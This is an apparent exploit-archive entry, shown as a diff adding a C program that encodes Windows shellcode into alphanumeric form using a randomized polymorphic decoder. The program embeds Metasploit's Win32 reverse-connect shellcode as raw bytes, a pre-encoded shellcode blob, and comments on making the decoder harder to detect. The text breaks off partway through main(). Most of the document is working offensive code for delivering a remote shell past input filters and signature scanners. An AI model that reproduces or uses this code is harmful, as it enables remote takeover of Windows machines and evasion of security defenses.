@@ -1,0 +1,542 @@
+id: 7050
+date: 08/03/2007
+title: Alphanumeric Shellcode Encoder Decoder
+author: Avri Schneider
+cves: 
+
+======================================
+Alphanumeric Shellcode Encoder Decoder
+======================================
+
+
+
+
+
+/*
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    Alphanumeric Shellcode Encoder Decoder
+    Copyright Â© 1985-2008 Avri Schneider - Aladdin Knowledge Systems, Inc. All rights reserved.
+
+    This program is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with this program.  If not, see <http://www.gnu.org/licenses/gpl-3.0.html>.
+
+     +-----------+
+      WORKS CITED
+     +-----------+
+    +--------------------------------------------------------------------------------------------------+
+    |Matt Conover, Soren Macbeth, Avri Schneider 05 October 2004                                       |
+    |Encode2Alnum (polymorphic alphanumeric decoder/encoder)                                           |
+    |Full-Disclosure <http://lists.grok.org.uk/pipermail/full-disclosure/2004-October/027147.html>     |
+    |                                                                                                  |
+    |CLET Team. Aug. 2003                                                                              |
+    |Polymorphic Shellcode Engine                                                                      |
+    |Phrack <http://www.phrack.org/show.php?p=61&a=9>                                                  |
+    |                                                                                                  |
+    |Ionescu, Costin. 1 July 2003                                                                      |
+    |Re: GetPC code (was: Shellcode from ASCII)                                                        |
+    |Vuln-Dev <http://www.securityfocus.com/archive/82/327348>                                         |
+    |                                                                                                  |
+    |rix. Aug. 2001                                                                                    |
+    |Writing ia32 alphanumeric shellcodes                                                              |
+    |Phrack <http://www.phrack.org/show.php?p=57&a=15>                                                 |
+    |                                                                                                  |
+    |Wever, Berend-Jan. 28 Jan. 2001                                                                   |
+    |Alphanumeric GetPC code                                                                           |
+    |Vuln-Dev <http://www.securityfocus.com/archive/82/351528>                                         |
+    |ALPHA3 <http://skypher.com/wiki/index.php?title=ALPHA3>                                           |
+    +--------------------------------------------------------------------------------------------------+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+*/
+#include <time.h>
+#include <stdio.h>
+#include <windows.h>
+
+#define MAX_BYTES                            0x100
+#define MAX_ENCODED_SHELLCODE                2000 //this will be allocated on the stack
+#define MIN_IP_STR_LEN                       7
+#define MAX_IP_STR_LEN                       15
+
+#define OFFSET_XOR_AL1_A                     15
+#define OFFSET_XOR_AL1_B                     18
+#define OFFSET_XOR_AL2_A                     37
+#define OFFSET_XOR_AL2_B                     40
+#define OFFSET_PUSH_DWORD1                   0
+#define OFFSET_PUSH_DWORD2                   1
+#define OFFSET_PUSH_DWORD3                   4
+#define OFFSET_PUSH_DWORD4                   12
+#define OFFSET_RANDOMIZED_DECODER_HEAD       14
+#define SIZE_RANDOMIZED_DECODER_HEAD         16
+BYTE EncodedShellcode[] = // encoded 336 bytes
+        "PZhUQPTX5UQPTHHH4D0B8RYkA9YA3A9A2B90B9BhPTRWX5PTRW4r8B9ugxPqy8xO"
+        "wck4WTyhlLlUjyhukHqGCixVLt4UTCBRwsV3pRod8OLMKO9FXJVTJJbJX4gsVXAt"
+        "Q3ukAxFmVIw7HyBfDyNv5zXqg4PQeTxZJLm56vRjSidjSz75mHb2RL5Hl30tUmnH"
+        "HtXEv7oZVdiEv1QwWijcgVk4CZn7NI3uRai32AZ7FS0Iq1cwWc5T5RlnTIiKJVmq"
+        "4T4MElucobfP4vWyB0OfB34JRJ9T4zjLlbKmlk7jTicj11869F001uAdTZKNJ7wL"
+        "mOv5mLlGPKFLtNI2525WhktKDO0NIlseHIuJ33xv7xGQAW55eZKXHw78zfvCI2U0"
+        "9Ulw5ZZhynmxG7JZZgJAYbg1MEp5QcOv7AYkYfcHQDWVMlJnzOSh8nzg1NZZn5Px"
+        "11U5INVEtvZOS1E094HqmbB6K1MfRIq7KQyNOeL7NHI1Xnwhyhy69bg2bTexGnkc"
+        "CEt90vn3DaFxGaFuRIPg0NK40kdg0L9ImaFbGy1Wl7JyGeJByHdfRCSYzvCzVa2v"
+        "RtQWG5lxRMN1CZREvyKFvfwij3X2P81J1wk9ZLmGAqxGPuQv7RBX411iaWKCLGnD"
+        "kwRZKREaRis5V7c5ILxKfAx6MbH40T53PnX9ZwSWtYzbHwCzkS0Ev5iVmLmS3xSk"
+        "1telLPYuGyNvX1TyJ3yLdOwckr";
+
+// example: make encoder choose more uppercase bytes...
+#define ADDITIONAL_CHARSET                   "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+#define ALNUM_CHARSET    ADDITIONAL_CHARSET  "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" // <--- allowed charset
+                                                                                                              //      feel free to
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////change - YMMV
+#define REGISTER_WITH_ADDRESS_OF_SHELLCODE   esp // <--- change this to the register holding the address of the decoder////////////
+#define _Q(str) #str
+#define Q(str) _Q(str)           
+#define P(str) #str ##" // <--- buffer offset\n"## _Q(str)
+///////////////////////////////////
+#define CONNECT_BACK_SHELLCODE   //
+//#undef  CONNECT_BACK_SHELLCODE //undefine CONNECT_BACK_SHELLCODE to use your own - and place it in shellcode[] >-----------------.
+                                 ///////////////////////////////////////////////////////////////////                               |
+int main();                                                                                       //                               |
+UCHAR *scan_str_known_pattern(UCHAR *alnum_str, UCHAR *known_pattern, UINT known_pattern_length); //                               |
+UCHAR get_push_register_instruction(UCHAR *reg);                                                  //                               |
+UCHAR get_random_alnum_value();                                                                   //                               |
+UCHAR get_random_alnum_push_dword_opcode();                                                       //                               |
+UCHAR *get_nop_slide(UINT size, UINT slide);                                                      ///////                          |
+UCHAR *slide_substr_forward(UCHAR *str, UINT substr_offset, UINT substr_len, UINT str_len, UINT slide);//                          |
+UCHAR *slide_substr_back(UCHAR *str, UINT substr_offset, UINT substr_len, UINT str_len, UINT slide);   //                          |
+UCHAR *shuffle(UCHAR str[], UINT length);                                                         ///////                          |
+DWORD my_htonl(DWORD dw_in);                                                                      //                               |
+DWORD ip_str_to_dw(UCHAR *str);                                                                   //                               |
+BOOL terminating_key_exist(UCHAR *alnum_shellcode, UCHAR *terminating_key);                       //                               |
+BOOL is_alnum(UCHAR c);                                                                           //                               |
+BOOL str_is_alnum(UCHAR *str);                                                                    //                               |
+UCHAR get_two_xor_complemets_for_byte_and_xor(UCHAR byte, UCHAR xor, int index);                  //                               |
+UCHAR *randomize_decoder_head(UCHAR *decoder, UINT size_decoder, UCHAR xor_al1, UCHAR jne_xor1);  //                               |
+struct xor2_key *get_xor2_and_key_for_xor1_and_c(UCHAR xor1, UCHAR c);                            //                               |
+struct xor2_key *choose_random_node(struct xor2_key *head);                                       //                               |
+void free_p_xor2_key(struct xor2_key *node);                                                      //                               |
+                                                                                                  //                               |
+struct xor2_key {                                                                                 //                               |
+    UCHAR xor2;                                                                                   //                               |
+    UCHAR key;                                                                                    //                               |
+    struct xor2_key *prev;                                                                        //                               |
+    struct xor2_key *next;                                                                        //                               |
+} xor2_key;                                                                                       //                               |
+                                                                                                  //                               |
+                                                                                                  //                               |
+//  Title:      Win32 Reverse Connect                                                             //                               |
+//  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003                            //                               |
+//  Author:     hdm[at]metasploit.com                                                             //                               |
+#ifdef CONNECT_BACK_SHELLCODE                                                                     //                               |
+    #define OFFSET_IP_ADDRESS                    154                                              //                               |
+    #define OFFSET_TCP_PORT_NUMBER               159                                              //                               |
+    #define IP_ADDRESS                           "127.0.0.1"                                      //                               |
+    #define TCP_PORT_NUMBER                      123                                              //                               |
+    DWORD ip_address;                                                                             //                               |
+    UCHAR shellcode[] =                                                                           //                               |
+                    "\xe8\x30\x00\x00\x00\x43\x4d\x44\x00\xe7\x79\xc6\x79\xec\xf9\xaa"            //                               |
+                    "\x60\xd9\x09\xf5\xad\xcb\xed\xfc\x3b\x8e\x4e\x0e\xec\x7e\xd8\xe2"            //                               |
+                    "\x73\xad\xd9\x05\xce\x72\xfe\xb3\x16\x57\x53\x32\x5f\x33\x32\x2e"            //                               |
+                    "\x44\x4c\x4c\x00\x01\x5b\x54\x89\xe5\x89\x5d\x00\x6a\x30\x59\x64"            //                               |
+                    "\x8b\x01\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x58\x08\xeb\x0c\x8d\x57"            //                               |
+                    "\x24\x51\x52\xff\xd0\x89\xc3\x59\xeb\x10\x6a\x08\x5e\x01\xee\x6a"            //                               |
+                    "\x08\x59\x8b\x7d\x00\x80\xf9\x04\x74\xe4\x51\x53\xff\x34\x8f\xe8"            //                               |
+                    "\x83\x00\x00\x00\x59\x89\x04\x8e\xe2\xeb\x31\xff\x66\x81\xec\x90"            //                               |
+                    "\x01\x54\x68\x01\x01\x00\x00\xff\x55\x18\x57\x57\x57\x57\x47\x57"            //                               |
+                    "\x47\x57\xff\x55\x14\x89\xc3\x31\xff\x68"                                    //                               |
+                    "IPIP" // I.P. address                                                        //                               |
+                    "\x68"                                                                        //                               |
+                    "PORT" // TCP port number                                                     //                               |
+                    "\x89\xe1\x6a\x10\x51\x53\xff\x55\x10\x85\xc0\x75\x44\x8d\x3c\x24"            //                               |
+                    "\x31\xc0\x6a\x15\x59\xf3\xab\xc6\x44\x24\x10\x44\xfe\x44\x24\x3d"            //                               |
+                    "\x89\x5c\x24\x48\x89\x5c\x24\x4c\x89\x5c\x24\x50\x8d\x44\x24\x10"            //                               |
+                    "\x54\x50\x51\x51\x51\x41\x51\x49\x51\x51\xff\x75\x00\x51\xff\x55"            //                               |
+                    "\x28\x89\xe1\x68\xff\xff\xff\xff\xff\x31\xff\x55\x24\x57\xff\x55"            //                               |
+                    "\x0c\xff\x55\x20\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c\x8b"            //                               |
+                    "\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32\x49"            //                               |
+                    "\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38\xe0\x74\x07\xc1"            //                               |
+                    "\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1\x8b\x5a\x24\x01"            //                               |
+                    "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\xeb"            //                               |
+                    "\x02\x31\xc0\x89\xea\x5f\x5e\x5d\x5b\xc2\x08\x00";                           //                               |
+#else                                                         //////////////////////////////////////                               |
+    UCHAR shellcode[] = "\xCC YOUR SHELLCODE GOES HERE \xCC"; // <----------------- here ------------------------------------------'
+#endif                                                        //
+DWORD size = sizeof(shellcode)-1;                             //
+                                                              //
+int main() {                                                  /////////////////////////////////////////////////////////
+    //(decoder address is in ecx when decoder starts)                                                                //
+    UCHAR PUSH_REGISTER_WITH_DECODER_ADDRESS = get_push_register_instruction(Q(REGISTER_WITH_ADDRESS_OF_SHELLCODE)); // >----------.
+//                                                                                                                   //            |
+#define END_OF_ENCODED_SHELLCODE    'A','L','D','N' // this is the terminating string of the encoded shellcode       //            |
+    UCHAR str_end_of_encoded_shellcode[]= {END_OF_ENCODED_SHELLCODE};  ////////////////////////////////////////////////            |
+    UCHAR xor_al1                       = get_random_alnum_value();    // this is used to zero out AL the first time               |
+    UCHAR xor_al2                       = get_random_alnum_value();    // this is used to zero out AL the second time              |
+    int offset_imul_key                 = '\xC1';////////////////////////                                                          |
+    int jne_xor1                        = '\xC2';//                 >---------------------------------------------------------.    |
+    int jne_xor2                        = '\xC3';//            >--------------------------------------------------------------|    |
+                                                 // you would need to play with these two values if you want to reduce        |    |
+                                                 // the size of the NOP slides - they obviously need to stay alnum.           |    |
+                                                 // You could also play with the value of AL before the XOR is done           |    |
+                                                 // to get your desired negative offset. keep in mind that it will cost       |    |
+                                                 // you instructions to get al to the value you want (if you use xor of       |    |
+                                                 // two alphanumeric bytes, you would need to push first alphanumeric         |    |
+                                                 // char to the stack, pop eax, then xor it with it's alnum complement)       |    |
+                                                 // This playing around would result in an even harder to detect decoder      |    |
+                                                 // as the offsets would be different                                         |    |
+    int size_decoder                    ='\xC4'; //                                                                           |    |
+    int half_size_decoder               ='\xC5'; ////////////////////////////////////////////////////////////////////         |    |
+    UCHAR imul_instruction_1            ='\x6B';                                                                   //         |    |
+    UCHAR imul_instruction_2            ='\x41';                                                                   //         |    |
+    UCHAR imul_instruction_3            ='\xC6'; //size of decoder+1                                               //         |    |
+    UCHAR imul_instruction_4            ='\xC7'; //initial key (random alnum)                                      //         |    |
+    //                                                                                                             //         |    |
+    UINT column=0, i=0;                                                               ///////////////////////////////         |    |
+    UCHAR *alnum = ALNUM_CHARSET;                                                     //                                      |    |
+    UCHAR *p_alnum = alnum;                                                           //                                      |    |
+    UCHAR decoder[] =                                                                 //                                      |    |
+    {   ////////////////////////////////////////////////////////////////////////////////                                      |    |
+        //                                                                                                                    |    |
+        //[step_1] -- multiply first encoded byte with key                                                                    |    |
+        //[step_2] -- xor result of step_1 with second encoded byte to get the decoded byte                                   |    |
+        //                                                                                                                    |    |
+        // Each binary byte is encoded into three alphanumeric bytes.                                                         |    |
+        // The first byte multipled by the third byte xor'ed against the second byte yeilds the original                      |    |
+        // binary byte.                                                                                                       |    |
+        //                                                                                                                    |    |
+        // TODO:                                                                                                              |    |
+        //    .--(first byte  ^ second byte) * third byte                                                                     |    |
+        //    '--(second byte ^  first byte) * third byte                                                                     |    |
+        //                                                                                                                    |    |
+        //    .--(first byte  ^  third byte) * second byte                                                                    |    |
+        //    '--(third byte  ^  first byte) * second byte                                                                    |    |
+        //                                                                                                                    |    |
+        //    .--(second byte ^  third byte) * first byte                                                                     |    |
+        //    '--(third byte  ^ second byte) * first byte                                                                     |    |
+        //                                                                                                                    |    |
+        //    .--(first byte  * second byte) ^ third byte                                                                     |    |
+        //    '--(second byte *  first byte) ^ third byte                                                                     |    |
+        //                                                                                                                    |    |
+        //    .--(first byte  *  third byte) ^ second byte <-- decoder/encoder implemented                                    |    |
+        //    '--(third byte  *  first byte) ^ second byte <-- decoder implemented (same encoder)                             |    |
+        //                                                                                                                    |    |
+        //    .--(second byte *  third byte) ^ first byte                                                                     |    |
+        //    '--(third byte  * second byte) ^ first byte                                                                     |    |
+        //                                                                                                                    |    |
+        //                                                                                                                    |    |
+        // The above is divided into pairs, each pair has the same values (in parenthesis) just at different offsets,         |    |
+        // and we can switch them around with no effect. Each option requires a different decoder, but each pair can use the  |    |
+        // same encoder.                                                                                                      |    |
+        //                                                                                                                    |    |
+            /////////// DECODER HEAD (will be randomized by sliding instructions) //////// >----------------------------------|----|---.
+   /* 1*/   '\x50',                                   //push ???  (this can change)     // [eax = address of decoder]------+  |    |   |
+   /* 2*/   '\x50',                                   //push ???  (this can change)     // [ecx = address of decoder]------+  |    |   |
+   /* 3*/   PUSH_REGISTER_WITH_DECODER_ADDRESS,       //push reg  (decoder address)     // [edx = address of decoder]------+  |    |   |
+   /* 4*/   PUSH_REGISTER_WITH_DECODER_ADDRESS,       //push reg  (base offset for cmp) // [ebx = address of decoder]------+  |    |   |
+   /* 5*/   '\x50',                                   //push ???  (this can change)     // [esp = address of decoder]------+  |    |   |
+   /* 7*/   '\x6A', half_size_decoder,                //push 35h  (word offset for cmp) // [ebp = decoder size / 2]--------+  |    |   |
+   /*12*/   '\x68', END_OF_ENCODED_SHELLCODE,         //push END_OF_ENCODED_SHELLCODE   // [esi = 4 bytes terminating key]>+  |    |   |
+   /*13*/   '\x50',                                   //push ???  (this can change)     // [edi = address of decoder]------+  |    |   |
+   /*14*/   '\x61',                                   //popad                           // [set all registers] <-----------'  |    |   |
+   /*16*/   '\x6A', xor_al1, //last decoder byte=0xB1 //push XOR_AL1    [JNE_XOR1^0xFF=al^JNE_XOR2=last byte==0xB1] >----.    |    |   |
+   /*17*/   '\x58',                                   //pop  eax       <-------------------------------------------------'    |    |   |
+   /*19*/   '\x34', xor_al1,                          //xor  al,XOR_AL1        [al = 0x00]                                    |    |   |
+   /*20*/   '\x48',                                   //dec  eax               [al = 0xFF] [you can play with AL here...]<----'    |   |
+   /*22*/   '\x34', jne_xor1,                         //xor  al,JNE_XOR1            [al = 0xFF ^ JNE_XOR1]                         |   |
+   /*25*/   '\x30', '\x42', size_decoder-1,           //xor  byte ptr [edx+size],al >--change-last-byte--.                         |   |
+   /*26*/   '\x52',                                   //push edx     [save decoder address on stack]     |                         |   |
+   /*27*/   '\x52',                                   //push edx     >----.                              |                         |   |
+   /*28*/   '\x59',                                   //pop  ecx   <------'  [ecx = address of decoder]  |                         |   |
+   /*29*/   '\x47',                                   //inc edi    we increment ebx keeping the decoder  |                         |   |
+   /*30*/   '\x43',                                   //inc ebx    length non-even (edi is unused)       |                         |   |
+            //////////////// DECODER_LOOP_START ///////////////////////////////////////////              |                         |   |
+   /*31*/   '\x58',      //get address of the decoder //pop  eax                          <---------. <--|-----------------.       |   |
+   /*32*/   '\x52',      //save edx                   //push edx   [can use edx now]>---------------|----|---------------. |       |   |
+   /*33*/   '\x51',      //save ecx                   //push ecx   [can use ecx now]   >------------|----|-------------. | |       |   |
+   /*34*/   '\x50',      //save address of decoder    //push eax   [can use eax now]      >---------|----|-----------. | | |       |   |
+   /*35*/   '\x50',      //save eax                   //push eax   >----.                           |    |           | | | |       |   |
+   /*36*/   '\x5A',      //restore into edx           //pop  edx <------'                           |    |           | | | |       |   |
+   /*38*/   '\x6A', xor_al2, //zero out al            //push XOR_AL2    [al = 0] >----.             |    |           | | | |       |   |
+   /*39*/   '\x58',          //zero out al            //pop  eax                      |             |    |           | | | |       |   |
+   /*41*/   '\x34', xor_al2, //zero out al            //xor  al,XOR_AL2    <----------'             |    |           | | | |       |   |
+   /*42*/   '\x50',      //save al on the stack (al=0)//push eax            >-----------------.     |    |           | | | |       |   |
+   /*45*/   '\x32', '\x42', offset_imul_key,          //xor  al,byte ptr [edx+off]            |     |    |           | | | |       |   |
+   /*48*/   '\x30', '\x42', offset_imul_key,          //xor  byte ptr [edx+off],al >--this-zero's-the-key----.       | | | |       |   |
+   /*49*/   '\x58', //restore al from the stack (al=0)//pop  eax       <----------------------'     |    |   |       | | | |       |   |
+   /*52*/   '\x32', '\x41', size_decoder+2, // get key in al  //xor  al,byte ptr [ecx+size+2]       |    |   |       | | | |       |   |
+   /*55*/   '\x30', '\x42', offset_imul_key,          //xor  byte ptr [edx+off],al >---this-changes-the-key--|----.  | | | |       |   |
+   /*56*/   '\x58',      //restore address of decoder //pop  eax  <---------------------------------|----|---|----|--' | | |       |   |
+   /*57*/   '\x59',      //restore ecx [word offset]  //pop  ecx     <------------------------------|----|---|----|----' | |       |   |
+   /*58*/   '\x5A',      //restore edx [byte offset]  //pop  edx        <---------------------------|----|---|----|------' |       |   |
+   /*59*/   '\x50',      //save address of decoder    //push eax  >---------------------------------|----|---|----|--------'       |   |
+            /////////// START NOP_SLIDE_1 /////////////////////////////////////////////////         |    |   |    |                |   |
+   /*60*/   '\x41',/////////////////////////////////////inc  ecx///////////////////////////         |    |   |    |                |   |
+   /*61*/   '\x49',/////////////////////////////////////dec  ecx///////////////////////////         |    |   |    |                |   |
+   /*62*/   '\x41',/////////////////////////////////////inc  ecx///////////////////////////         |    |   |    |                |   |
+   /*63*/   '\x49',/////////////////////////////////////dec  ecx+-----------------------+//         |    |   |    |                |   |
+   /*64*/   '\x41',//     IMUL can go here and bellow //inc  ecx|                       |//         |    |   |    |                |   |
+   /*65*/   '\x49',//                                 //dec  ecx|   16 bytes            |//         |    |   |    |                |   |
+   /*66*/   '\x41',//                                 //inc  ecx|   NOP slide           |//         |    |   |    |                |   |
+   /*67*/   '\x49',//                                 //dec  ecx|                       |//         |    |   |    |                |   |
+   /*68*/   '\x41',//                                 //inc  ebx| can mungle eax until  |//         |    |   |    |                |   |
+   /*69*/   '\x49',//       will be randomized        //dec  ebx| IMUL_INSTRUCTION      |//         |    |   |    |                |   |
+   /*70*/   '\x41',//                                 //inc  edx|                       |//         |    |   |    |                |   |
+   /*71*/   '\x49',//                                 //dec  edx|                       |//         |    |   |    |                |   |
+   /*72*/   '\x41',//                                 //inc  esi|                       |//         |    |   |    |                |   |
+   /*73*/   '\x49',//                                 //dec  esi+-----------------------+//         |    |   |    |                |   |
+   /*74*/   '\x41',//                                 //push eax///////////////////////////         |    |   |    |                |   |
+   /*75*/   '\x49',//                                 //pop  eax//////////////////////// //         |    |   |    |                |   |
+            //////////// END NOP_SLIDE_1 //////////////////////////////////////////////////         |    |   |    |                |   |
+            //                                                                                      |    |   |    |                |   |
+            // We can move around the IMUL_INSTRUCTION inside the NOP slides - but not before       |    |   |    |                |   |
+            // MAX_OFFSET_OFFSET_IMUL i.e. we can't move it before the first 4 bytes of NOP_SLIDE_1 |    |   |    |                |   |
+            // or the offset will not be alphanumeric.                                              |    |   |    |                |   |
+            //                                                                                      |    |   |    |                |   |
+            // We need to move the IMUL_INSTRUCTION in two byte increments, as we may modify eax in |    |   |    |                |   |
+            // NOP_SLIDE_1 and we can't change eax after the IMUL_INSTRUCTION (as the result goes   |    |   |    |                |   |
+            // into eax) - this limitation can be overcome if we make sure not to modify eax after  |    |   |    |                |   |
+            // the IMUL_INSTRUCTION - and it is easy enough, as we don't care about eax' value at   |    |   |    |                |   |
+            // all - so we don't need to restore it. We can simply increment or decrement an unused |    |   |    |                |   |
+            // register instead. We happen to have such a register - edi =]                         |    |   |    |                |   |
+            //                                                                                      |    |   |    |                |   |
+            // So in NOP_SLIDE_1, we can't use push eax;pop eax unless they will not be split by    |    |   |    |                |   |
+            // the IMUL_INSTRUCTION - because we would need the value of eax after the imul, and    |    |   |    |                |   |
+            // the pop eax would overwrite it                                                       |    |   |    |                |   |
+            //                                                                                      |    |   |    |                |   |
+            // But we could use a dec eax;inc edi or a dec eax;dec edi combinations (inc eax is not |    |   |    |                |   |
+            // alphanumeric.).                                                                      |    |   |    |                |   |
+            //                                                                                      |    |   |    |                |   |
+            // -OBSOLETE-                                                                           |    |   |    |                |   |
+            // I have set here the IMUL_INSTRUCTION between NOP_SLIDE_1 and NOP_SLIDE_2             |    |   |    |                |   |
+            // If you wish to move it up, you will need to move it up by an even number of bytes.   |    |   |    |                |   |
+            // You will then need to change OFFSET_OFFSET_IMUL accordingly                          |    |   |    |                |   |
+            // (add the number of bytes to it)                                                      |    |   |    |                |   |
+            // If you wish to move it down, you will need to move it down by an even number of      |    |   |    |                |   |
+            // bytes.                                                                               |    |   |    |                |   |
+            // You will then need to change OFFSET_OFFSET_IMUL accordingly                          |    |   |    |                |   |
+            // (deduct the number of bytes from it)                                                 |    |   |    |                |   |
+            //                                                                                      |    |   |    |                |   |
+            // TODO: make a routine that moves it around randomally between allowed values          |    |   |    |                |   |
+            // and sets the proper offsets                                                          |    |   |    |                |   |
+            // this routine should be called after the NOP slides have been randomized.             |    |   |    |                |   |
+            //                                                                                      |    |   |    |                |   |
+            ////////// START NOP_SLIDE_2 ////////////////////////////////////////////////////       |    |   |    |                |   |
+   /*76*/   '\x41',//                                   //inc  ecx///////////////////////////       |    |   |    |                |   |
+   /*77*/   '\x49',//                                   //dec  ecx///////////////////////////       |    |   |    |                |   |
+   /*78*/   '\x41',//                                   //inc  ebx///////////////////////////       |    |   |    |                |   |
+   /*79*/   '\x49',//                                   //dec  ebx+-----------------------+//       |    |   |    |                |   |
+   /*80*/   '\x41',//      will be randomized           //inc  edx|                       |//       |    |   |    |                |   |
+   /*81*/   '\x49',//                                   //dec  edx|   12 bytes            |//       |    |   |    |                |   |
+   /*82*/   '\x41',//                                   //inc  esi|   NOP slide           |//       |    |   |    |                |   |
+   /*83*/   '\x49',//                                   //dec  esi|                       |//       |    |   |    |                |   |
+   /*84*/   '\x41',//                                   //push eax|                       |//       |    |   |    |                |   |
+   /*85*/   '\x49',//                                   //pop  eax|                       |//       |    |   |    |                |   |
+   /*86*/   '\x41',//                                   //inc  ecx+-----------------------+//       |    |   |    |                |   |
+   /*87*/   '\x49',//                                   //dec  ecx///////////////////////////       |    |   |    |                |   |
+            //           IMUL can go down to here                                                   |    |   |    |                |   |
+            /////////           [step_1]   //imul eax,dword ptr [ecx+size_decoder+1],45h            |    |   |    |                |   |
+   /*91*/imul_instruction_1, imul_instruction_2, imul_instruction_3, imul_instruction_4,// <-This-key-will-change-'                |   |
+            ////////// END NOP_SLIDE_2////////////////////////////////////////////////////          |    |                         |   |
+   /*92 */  '\x41',      //ecx incremented once       //inc  ecx  ---------------------.            |    |                         |   |
+   /*95 */  '\x33', '\x41', size_decoder,   //[step_2]//xor  eax,dword ptr [ecx+size]  | <--------------------store decoded        |   |
+   /*98 */  '\x32', '\x42', size_decoder,             //xor  al,byte ptr [edx+size]    |ecx = ecx+2 |    |    byte                 |   |
+   /*101*/  '\x30', '\x42', size_decoder,             //xor  byte ptr [edx+size],al    |            |    |(eax=result of IMUL)     |   |
+   /*102*/  '\x41',      //ecx incremented twice      //inc  ecx  ---------------------'            |    |                         |   |
+   /*103*/  '\x42',      //edx incremented once       //inc  edx                        edx = edx+1 |    |                         |   |
+   /*104*/  '\x45',      //ebp incremented once       //inc  ebp                                    |    |                         |   |
+   /*107*/  '\x39', '\x34', '\x6B',         //cmp  dword ptr [ebx+ebp*2],esi // check if we reached the end                        |   |
+   /*109*/  '\x75', jne_xor2,               // <===0xB1   //jne  DECODER_LOOP_START  >--------------' <--'                         |   |
+            '\x00' // If you change the length of the decoder, the jne would need to jump to a different offset than 0xB1          |   |
+    };//////////////////////////////////////////////////                                                                           |   |
+    UINT shrink;                                      //                                                                           |   |
+    UCHAR *found_msg;                                 //                                                                           |   |
+    UCHAR *p_decoder = decoder;                       //                                                                           |   |
+    UCHAR xor1, xor2, key;                            //                                                                           |   |
+    UCHAR temp_buf[3] = "";                           //                                                                           |   |
+    UCHAR alnum_shellcode[MAX_ENCODED_SHELLCODE] = "";//                                                                           |   |
+    UCHAR *p_alnum_shellcode = alnum_shellcode;       //                 todo: allow for the key to be either the first,           |   |
+    struct xor2_key *p_xor2_key = 0;                  //                       the second or the third byte (currently third).     |   |
+    UCHAR *p_shellcode = shellcode;                   //                                                                           |   |
+    void *_eip = 0;                                   //                                                                           |   |
+                                                      //                                                                           |   |
+    int offset_nop_slide1;                            //                                                                           |   |
+    int offset_nop_slide2;                            //                                                                           |   |
+    int offset_half_size_decoder;                     //                                                                           |   |
+    int offset_terminating_key;                       //                                                                           |   |
+    int offset_imul_instruction1;                     //                                                                           |   |
+    int offset_imul_instruction2;                     //                                                                           |   |
+    int offset_imul_instruction3;                     //                                                                           |   |
+    int offset_imul_instruction4;                     //                                                                           |   |
+    int negative_offset_size_decoder1;                //                                                                           |   |
+    int negative_offset_size_decoder2;                //                                                                           |   |
+    int negative_offset_size_decoder3;                //                                                                           |   |
+    int offset_size_decoder_min_1;                    //                                                                           |   |
+    int offset_size_decoder_pls_2;                    //                                                                           |   |
+    int offset_imul_key_offset1;                      //                                                                           |   |
+    int offset_imul_key_offset2;                      //                                                                           |   |
+    int offset_imul_key_offset3;                      //                                                                           |   |
+    int offset_imul_instruction;                      //                                                                           |   |
+    int size_nop_slide1;                              //                                                                           |   |
+    int size_nop_slide2;                              //                                                                           |   |
+    int offset_jne_xor1;                              //                                                                           |   |
+    int offset_jne_xor2;                              //                                                                           |   |
+    int decoder_length_section1;                      //                                                                           |   |
+    int decoder_length_section2;                      //                                                                           |   |
+    int decoder_length_section3;                      //                                                                           |   |
+    int imul_instruction_length;                      //                                                                           |   |
+    int jne_xor_negative_offset;                      //                                                                           |   |
+    int backward_slide_offset;                        //                                                                           |   |
+    BOOL decoder_version_1;                           //                                                                           |   |
+    UINT srand_value;                                 //                                                                           |   |
+#ifdef CONNECT_BACK_SHELLCODE                         /////////////////////////////////////////////                                |   |
+    printf("scanning EncodedShellcode for shellcode up to OFFSET_IP_ADDRESS bytes\n");           //                                |   |
+    found_msg = scan_str_known_pattern(EncodedShellcode, shellcode, OFFSET_IP_ADDRESS);          //                                |   |
+    if (found_msg) printf("shellcode found encoded in EncodedShellcode using %s.\n", found_msg); //                                |   |
+    else printf("shellcode not found encoded in EncodedShellcode.\n");/////////////////////////////                                |   |
+#endif                                                //////////////////                                                           |   |
+    printf("shellcode length:%d\n", size);            //                                                                           |   |
+    srand_value = time(NULL);                         //                                                                           |   |
+//  srand_value =           ;                         // for debugging                                                             |   |
+    srand(srand_value);                               //                                                                           |   |
+    printf("srand value=%d\n", srand_value);          //                                                                           |   |
+    decoder_version_1 = rand() % 2;                   //                                                                           |   |
+                                                      /////                                                                        |   |
+    size_decoder                       = strlen(decoder);//                                                                        |   |
+    decoder_length_section1            = 30; //////////////                                                                        |   |
+    decoder_length_section2            = 29; //                                                                                    |   |
+    decoder_length_section3            = 18; //                                                                                    |   |
+                                             //                                                                                    |   |
+    size_nop_slide1                    = 28; //                                                                                    |   |
+    size_nop_slide2                    = 0;  //                                                                                    |   |
+                                             //                                                                                    |   |
+    imul_instruction_length            = 4;  //                                                                                    |   |
+                                             //                                                                                    |   |
+    shrink = (rand()%6)*2;                   //////////////////////////////////////////////////// (can shrink up to 10 bytes       |   |
+    memmove(decoder+decoder_length_section1+decoder_length_section2+size_nop_slide1-shrink,    //  in 2 byte increments)           |   |
+            decoder+decoder_length_section1+decoder_length_section2+size_nop_slide1,           //                                  |   |
+                      imul_instruction_length+size_nop_slide2+decoder_length_section3+1);      //                                  |   |
+    size_decoder -=shrink;                ///////////////////////////////////////////////////////                                  |   |
+    half_size_decoder = size_decoder/2;   //                                                                                       |   |
